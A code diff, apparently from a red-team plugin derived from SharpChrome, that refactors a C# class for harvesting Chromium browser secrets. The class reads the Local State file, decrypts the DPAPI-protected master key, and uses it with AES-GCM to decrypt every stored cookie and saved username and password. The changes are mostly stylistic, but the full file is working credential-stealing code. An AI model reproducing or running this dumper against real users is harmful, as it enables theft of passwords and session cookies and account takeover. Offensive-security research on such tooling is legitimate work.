@@ -1,44 +1,42 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
-using System.IO;
-using System.Diagnostics;
-using System.Security.Cryptography;
-using CS_SQLite3;
-using System.Reflection;
-using System.Runtime.InteropServices;
 using System.Data;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+using System.Text;
+using CS_SQLite3;
+using Utils;
 
 namespace Plugin
 {
-    class ChromiumCredentialManager
+    internal class ChromiumCredentialManager
     {
-        internal string userDataPath;
-        internal string userChromiumHistoryPath;
+        internal const int AES_BLOCK_SIZE = 16;
+
+        internal static byte[] DPAPI_HEADER = Encoding.UTF8.GetBytes("DPAPI");
+        internal static byte[] DPAPI_CHROME_UNKV10 = Encoding.UTF8.GetBytes("v10");
+        internal byte[] aesKey;
+        internal string chromiumBasePath;
+
+        internal string[] filterDomains;
+        internal BCrypt.SafeAlgorithmHandle hAlg;
+        internal BCrypt.SafeKeyHandle hKey;
         internal string userChromiumBookmarksPath;
         internal string userChromiumCookiesPath;
+        internal string userChromiumHistoryPath;
         internal string userChromiumLoginDataPath;
+        internal string userDataPath;
         internal string userLocalStatePath;
-        internal string chromiumBasePath;
-        internal bool useTmpFile = false;
-        internal byte[] aesKey = null;
-        internal BCrypt.SafeAlgorithmHandle hAlg = null;
-        internal const int AES_BLOCK_SIZE = 16;
-        internal BCrypt.SafeKeyHandle hKey = null;
+        internal bool useTmpFile;
 
-        internal string[] filterDomains = null;
-
-        internal static byte[] DPAPI_HEADER = UTF8Encoding.UTF8.GetBytes("DPAPI");
-        internal static byte[] DPAPI_CHROME_UNKV10 = UTF8Encoding.UTF8.GetBytes("v10");
         public ChromiumCredentialManager(string basePath, string[] domains = null)
         {
             if (Environment.GetEnvironmentVariable("USERNAME").Contains("SYSTEM"))
                 throw new Exception("Cannot decrypt Chromium credentials from a SYSTEM level context.");
             if (domains != null && domains.Length > 0)
                 filterDomains = domains;
-            string localAppData = Environment.GetEnvironmentVariable("LOCALAPPDATA");
+            var localAppData = Environment.GetEnvironmentVariable("LOCALAPPDATA");
             hKey = null;
             hAlg = null;
             chromiumBasePath = basePath;
@@ -55,7 +53,7 @@ namespace Plugin
             //{
             //    useTmpFile = true;
             //}
-            string key = GetBase64EncryptedKey();
+            var key = GetBase64EncryptedKey();
             if (key != "")
             {
                 //Console.WriteLine("Normal DPAPI Decryption");
@@ -70,17 +68,16 @@ namespace Plugin
 
         private HostCookies[] ExtractCookiesFromSQLQuery(DataTable query)
         {
-            List<Cookie> cookies = new List<Cookie>();
-            List<HostCookies> hostCookies = new List<HostCookies>();
+            var cookies = new List<Cookie>();
+            var hostCookies = new List<HostCookies>();
             HostCookies hostInstance = null;
-            string lastHostKey = "";
+            var lastHostKey = "";
             foreach (DataRow row in query.Rows)
-            {
-                try 
+                try
                 {
                     if (row == null)
                         continue;
-                    if (row["host_key"].GetType() != typeof(System.DBNull) && lastHostKey != (string)row["host_key"])
+                    if (row["host_key"].GetType() != typeof(DBNull) && lastHostKey != (string)row["host_key"])
                     {
                         lastHostKey = (string)row["host_key"];
                         if (hostInstance != null)
@@ -88,53 +85,52 @@ namespace Plugin
                             hostInstance.Cookies = cookies.ToArray();
                             hostCookies.Add(hostInstance);
                         }
+
                         hostInstance = new HostCookies();
                         hostInstance.HostName = lastHostKey;
                         cookies = new List<Cookie>();
                     }
-                    Cookie cookie = new Cookie();
+
+                    var cookie = new Cookie();
                     cookie.Domain = row["host_key"].ToString();
                     long expDate;
-                    Int64.TryParse(row["expires_utc"].ToString(), out expDate);
+                    long.TryParse(row["expires_utc"].ToString(), out expDate);
                     // https://github.com/djhohnstein/SharpChrome/issues/1
-                    if ((expDate / 1000000.000000000000) - 11644473600 > 0)
-                        cookie.ExpirationDate = (expDate / 1000000.000000000000000) - 11644473600;
-                    cookie.HostOnly = cookie.Domain[0] == '.' ? false : true; // I'm not sure this is stored in the cookie store and seems to be always false
+                    if (expDate / 1000000.000000000000 - 11644473600 > 0)
+                        cookie.ExpirationDate = expDate / 1000000.000000000000000 - 11644473600;
+                    cookie.HostOnly =
+                        cookie.Domain[0] == '.'
+                            ? false
+                            : true; // I'm not sure this is stored in the cookie store and seems to be always false
                     if (row["is_httponly"].ToString() == "1")
-                    {
                         cookie.HttpOnly = true;
-                    }
                     else
-                    {
                         cookie.HttpOnly = false;
-                    }
                     cookie.Name = row["name"].ToString();
                     cookie.Path = row["path"].ToString();
                     // cookie.SameSite = "no_restriction"; // Not sure if this is the same as firstpartyonly
                     if (row["is_secure"].ToString() == "1")
-                    {
                         cookie.Secure = true;
-                    }
                     else
-                    {
                         cookie.Secure = false;
-                    }
-                    cookie.Session = row["is_persistent"].ToString() == "0" ? true : false; // Unsure, this seems to be false always
-                                                                                            //cookie.StoreId = "0"; // Static
+                    cookie.Session =
+                        row["is_persistent"].ToString() == "0" ? true : false; // Unsure, this seems to be false always
+                    //cookie.StoreId = "0"; // Static
                     cookie.StoreId = null;
                     cookie.SetSameSiteCookie(row["sameSite"].ToString());
-                    byte[] cookieValue = Convert.FromBase64String(row["encrypted_value"].ToString());
+                    var cookieValue = Convert.FromBase64String(row["encrypted_value"].ToString());
                     cookieValue = DecryptBlob(cookieValue);
                     if (cookieValue != null)
-                        cookie.Value = System.Text.Encoding.UTF8.GetString(cookieValue);
+                        cookie.Value = Encoding.UTF8.GetString(cookieValue);
                     else
                         cookie.Value = "";
                     if (cookie != null)
                         cookies.Add(cookie);
-                } 
-                catch { }
-                
-            }
+                }
+                catch
+                {
+                }
+
             return hostCookies.ToArray();
         }
 
@@ -147,10 +143,10 @@ namespace Plugin
             BCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
             int dwDataOutLen;
             //IntPtr pDataOut = IntPtr.Zero;
-            IntPtr pData = IntPtr.Zero;
+            var pData = IntPtr.Zero;
             uint ntStatus;
             byte[] subArrayNoV10;
-            int pcbResult = 0;
+            var pcbResult = 0;
             unsafe
             {
                 if (ByteArrayEquals(dwData, 0, DPAPI_CHROME_UNKV10, 0, 3))
@@ -163,21 +159,23 @@ namespace Plugin
                     //IntPtr shiftedEncValPtr = IntPtr.Zero;
                     try
                     {
-
                         //shiftedEncValPtr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(byte)) * shiftedEncVal.Length);
                         Marshal.Copy(dwData, 0, pData, dwData.Length);
-                        Utils.MiscUtils.BCRYPT_INIT_AUTH_MODE_INFO(out info);
+                        MiscUtils.BCRYPT_INIT_AUTH_MODE_INFO(out info);
                         info.pbNonce = (byte*)(pData + DPAPI_CHROME_UNKV10.Length);
                         info.cbNonce = 12;
-                        info.pbTag = info.pbNonce + dwData.Length - (DPAPI_CHROME_UNKV10.Length + AES_BLOCK_SIZE); // AES_BLOCK_SIZE = 16
+                        info.pbTag = info.pbNonce + dwData.Length -
+                                     (DPAPI_CHROME_UNKV10.Length + AES_BLOCK_SIZE); // AES_BLOCK_SIZE = 16
                         info.cbTag = AES_BLOCK_SIZE; // AES_BLOCK_SIZE = 16
                         dwDataOutLen = dwData.Length - DPAPI_CHROME_UNKV10.Length - info.cbNonce - info.cbTag;
                         dwDataOut = new byte[dwDataOutLen];
 
                         fixed (byte* pDataOut = dwDataOut)
                         {
-                            ntStatus = BCrypt.BCryptDecrypt(hKey, info.pbNonce + info.cbNonce, dwDataOutLen, (void*)&info, null, 0, pDataOut, dwDataOutLen, out pcbResult, 0);
+                            ntStatus = BCrypt.BCryptDecrypt(hKey, info.pbNonce + info.cbNonce, dwDataOutLen, &info,
+                                null, 0, pDataOut, dwDataOutLen, out pcbResult, 0);
                         }
+
                         if (NT_SUCCESS(ntStatus))
                         {
                             //Console.WriteLine("{0} : {1}", dwDataOutLen, pDataOut);
@@ -185,7 +183,6 @@ namespace Plugin
                     }
                     catch (Exception ex)
                     {
-
                     }
                     finally
                     {
@@ -198,58 +195,60 @@ namespace Plugin
                     }
                 }
             }
+
             return dwDataOut;
         }
 
         // You want cookies? Get them here.
         public HostCookies[] GetCookies()
         {
-            string cookiePath = userChromiumCookiesPath;
+            var cookiePath = userChromiumCookiesPath;
             if (useTmpFile)
-                cookiePath = Utils.FileUtils.CreateTempDuplicateFile(userChromiumCookiesPath);
-            SQLiteDatabase database = new SQLiteDatabase(cookiePath);
-            string query = "SELECT * FROM cookies ORDER BY host_key";
-            DataTable resultantQuery = database.ExecuteQuery(query);
+                cookiePath = FileUtils.CreateTempDuplicateFile(userChromiumCookiesPath);
+            var database = new SQLiteDatabase(cookiePath);
+            var query = "SELECT * FROM cookies ORDER BY host_key";
+            var resultantQuery = database.ExecuteQuery(query);
             database.CloseDatabase();
-            HostCookies[] rawCookies = ExtractCookiesFromSQLQuery(resultantQuery);
+            var rawCookies = ExtractCookiesFromSQLQuery(resultantQuery);
             if (useTmpFile)
                 try
                 {
                     File.Delete(cookiePath);
                 }
-                catch { Console.WriteLine("[X] Failed to delete temp cookie path at {0}", cookiePath); }
+                catch
+                {
+                    Console.WriteLine("[X] Failed to delete temp cookie path at {0}", cookiePath);
+                }
+
             return rawCookies;
         }
 
 
         public SavedLogin[] GetSavedLogins()
         {
-            string loginData = userChromiumLoginDataPath;
+            var loginData = userChromiumLoginDataPath;
             if (useTmpFile)
-                loginData = Utils.FileUtils.CreateTempDuplicateFile(loginData);
-            SQLiteDatabase database = new SQLiteDatabase(loginData);
-            string query = "SELECT action_url, username_value, password_value FROM logins";
-            DataTable resultantQuery = database.ExecuteQuery(query);
-            List<SavedLogin> logins = new List<SavedLogin>();
+                loginData = FileUtils.CreateTempDuplicateFile(loginData);
+            var database = new SQLiteDatabase(loginData);
+            var query = "SELECT action_url, username_value, password_value FROM logins";
+            var resultantQuery = database.ExecuteQuery(query);
+            var logins = new List<SavedLogin>();
             foreach (DataRow row in resultantQuery.Rows)
             {
-                string password = String.Empty;
-                byte[] passwordBytes = Convert.FromBase64String((string)row["password_value"]);
-                byte[] decBytes = DecryptBlob(passwordBytes);
+                var password = string.Empty;
+                var passwordBytes = Convert.FromBase64String((string)row["password_value"]);
+                var decBytes = DecryptBlob(passwordBytes);
                 if (decBytes != null)
                     // https://github.com/djhohnstein/SharpChrome/issues/6
                     password = Encoding.UTF8.GetString(decBytes);
-                if (password != String.Empty)
-                {
-                    logins.Add(new SavedLogin(row["action_url"].ToString(), row["username_value"].ToString(), password));
-                }
+                if (password != string.Empty)
+                    logins.Add(new SavedLogin(row["action_url"].ToString(), row["username_value"].ToString(),
+                        password));
             }
+
             database.CloseDatabase();
             return logins.ToArray();
         }
-
-
-
 
 
         private bool Chromium()
@@ -262,41 +261,39 @@ namespace Plugin
                 userChromiumLoginDataPath,
                 userLocalStatePath
             };
-            foreach (string path in paths)
-            {
+            foreach (var path in paths)
                 if (File.Exists(path))
                     return true;
-            }
             return false;
         }
 
         public static byte[] DecryptBase64StateKey(string base64Key)
         {
-            byte[] encryptedKeyBytes = System.Convert.FromBase64String(base64Key);
+            var encryptedKeyBytes = Convert.FromBase64String(base64Key);
             if (ByteArrayEquals(DPAPI_HEADER, 0, encryptedKeyBytes, 0, 5))
             {
                 //Console.WriteLine("> Key appears to be encrypted using DPAPI");
-                byte[] encryptedKey = new byte[encryptedKeyBytes.Length - 5];
+                var encryptedKey = new byte[encryptedKeyBytes.Length - 5];
                 Array.Copy(encryptedKeyBytes, 5, encryptedKey, 0, encryptedKeyBytes.Length - 5);
-                byte[] decryptedKey = ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);
+                var decryptedKey = ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);
                 return decryptedKey;
             }
-            else
-            {
-                Console.WriteLine("Unknown encoding.");
-            }
+
+            Console.WriteLine("Unknown encoding.");
             return null;
         }
 
-        private static bool ByteArrayEquals(byte[] sourceArray, int sourceIndex, byte[] destArray, int destIndex, int len)
+        private static bool ByteArrayEquals(byte[] sourceArray, int sourceIndex, byte[] destArray, int destIndex,
+            int len)
         {
-            int j = destIndex;
-            for (int i = sourceIndex; i < sourceIndex + len; i++)
+            var j = destIndex;
+            for (var i = sourceIndex; i < sourceIndex + len; i++)
             {
                 if (sourceArray[i] != destArray[j])
                     return false;
                 j++;
             }
+
             return true;
         }
 
@@ -304,18 +301,18 @@ namespace Plugin
         {
             if (!File.Exists(userLocalStatePath))
                 return "";
-            string localStateData = File.ReadAllText(userLocalStatePath);
-            string searchTerm = "encrypted_key";
-            int startIndex = localStateData.IndexOf(searchTerm);
+            var localStateData = File.ReadAllText(userLocalStatePath);
+            var searchTerm = "encrypted_key";
+            var startIndex = localStateData.IndexOf(searchTerm);
             if (startIndex < 0)
                 return "";
             // encrypted_key":"BASE64"
-            int keyIndex = startIndex + searchTerm.Length + 3;
-            string tempVals = localStateData.Substring(keyIndex);
-            int stopIndex = tempVals.IndexOf('"');
+            var keyIndex = startIndex + searchTerm.Length + 3;
+            var tempVals = localStateData.Substring(keyIndex);
+            var stopIndex = tempVals.IndexOf('"');
             if (stopIndex < 0)
                 return "";
-            string base64Key = tempVals.Substring(0, stopIndex);
+            var base64Key = tempVals.Substring(0, stopIndex);
             return base64Key;
         }
 
@@ -325,9 +322,10 @@ namespace Plugin
         }
 
         //kuhl_m_dpapi_chrome_alg_key_from_raw
-        public static bool DPAPIChromiumAlgFromKeyRaw(byte[] key, out BCrypt.SafeAlgorithmHandle hAlg, out BCrypt.SafeKeyHandle hKey)
+        public static bool DPAPIChromiumAlgFromKeyRaw(byte[] key, out BCrypt.SafeAlgorithmHandle hAlg,
+            out BCrypt.SafeKeyHandle hKey)
         {
-            bool bRet = false;
+            var bRet = false;
             hAlg = null;
             hKey = null;
             uint ntStatus;
@@ -337,11 +335,12 @@ namespace Plugin
                 ntStatus = BCrypt.BCryptSetProperty(hAlg, "ChainingMode", "ChainingModeGCM", 0);
                 if (NT_SUCCESS(ntStatus))
                 {
-                    ntStatus = BCrypt.BCryptGenerateSymmetricKey(hAlg, out hKey, null, 0, key, key.Length, 0);
+                    ntStatus = BCrypt.BCryptGenerateSymmetricKey(hAlg, out hKey, null, 0, key, key.Length);
                     if (NT_SUCCESS(ntStatus))
                         bRet = true;
                 }
             }
+
             return bRet;
         }
     }
